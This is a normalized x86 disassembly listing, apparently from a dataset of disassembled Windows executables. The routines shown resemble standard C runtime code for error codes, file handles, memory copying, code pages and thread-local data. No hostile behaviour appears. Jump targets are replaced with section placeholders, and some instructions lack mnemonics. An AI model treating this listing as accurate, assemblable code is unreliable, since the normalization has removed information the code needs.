call sub_2005634
mov [ eax ] esi
call sub_2005621
mov [ eax ] 0x16
jmp r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2007033
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_2006be9
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20076e8
mov eax [ ebp - 0x1c ]
sub_20076f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_2007724
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_2005621
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_20039e0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_2003ed0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_2005621
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
mov eax esi
jmp r-xdata
sub_20077a1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_200ccb9
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_2005647
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_200ccb9
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_200ccb9
push 0x1
mov edi eax
call sub_200ccb9
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_200cc33
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_200783d
push 0x10
push r--data
call sub_2006310
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] edi
call sub_2005621
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_2006355
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200cd30
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_2005621
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_20077a1
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2007900
mov eax [ ebp - 0x1c ]
sub_200790a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_200368f
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_200793b
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_20079c2
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_20079c2
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_200793b
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_2007aa5
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_2007ad4
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_20039e0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_2007b38
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_200d555
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_200d356
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_200d356
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_20039e0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_2007ccb
push 0xc
push r--data
call sub_2006310
call sub_2008774
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2007d66
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_2006355
retn
push 0x20
call sub_20051d1
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_200368f
pop ecx
sub_2007d6f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_2004235
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_2007deb
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_2007d6f
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_2007ad4
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_20039e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_2007aa5
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_2007b38
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_20039e0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_2007aa5
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_2007fd0
push 0x14
push r--data
call sub_2006310
or [ ebp - 0x20 ] 0xffffffff
call sub_2008774
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_2007ccb
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_2007d6f
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_200ba1e
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_2006355
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_2007deb
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_2005621
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_200368f
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_200368f
pop ecx
push 0xd
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2008131
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_200368f
pop ecx
sub_2008188
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_200368f
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_200368f
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_200368f
push [ esi + 0xc0 ]
call sub_200368f
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_200d597
push [ edi ]
call sub_200368f
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_200368f
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_200368f
pop ecx
push [ esi + 0xb0 ]
call sub_200368f
push [ esi + 0xbc ]
call sub_200368f
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_200368f
push [ esi + 0xbc ]
call sub_200d771
pop ecx
pop ecx
push eax
call sub_200368f
pop ecx
push eax
call sub_200368f
push [ esi + 0xbc ]
call sub_200d72c
pop ecx
pop ecx
sub_20082d1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_2008360
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_20083f9
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_20082d1
pop ecx
test esi esi
je r-xdata
push esi
call sub_2008360
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_2008188
pop ecx
sub_2008437
push 0xc
push r--data
call sub_2006310
call sub_2008774
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_20083f9
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20084a1
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_2008774
mov esi [ eax + 0x6c ]
mov eax esi
call sub_2006355
retn
push 0x20
call sub_20051d1
pop ecx
sub_20084ad
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_20051a1
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_2008528
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_20051a1
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_20085a3
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_2008528
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_20085d7
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_2008528
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_20056e5
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_2008614
push 0xc
push r--data
call sub_2006310
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_20051a1
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20086e9
push 0xc
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_20082d1
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20086f2
call sub_2006355
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_20086fb
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_20085a3
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_200ba63
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_2008528
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_200368f
pop ecx
xor esi esi
push 0x0
push esi
call sub_2008614
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_200878e
push 0x8
push r--data
call sub_2006310
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_2006355
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_200368f
pop ecx
push 0xd
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_200368f
pop ecx
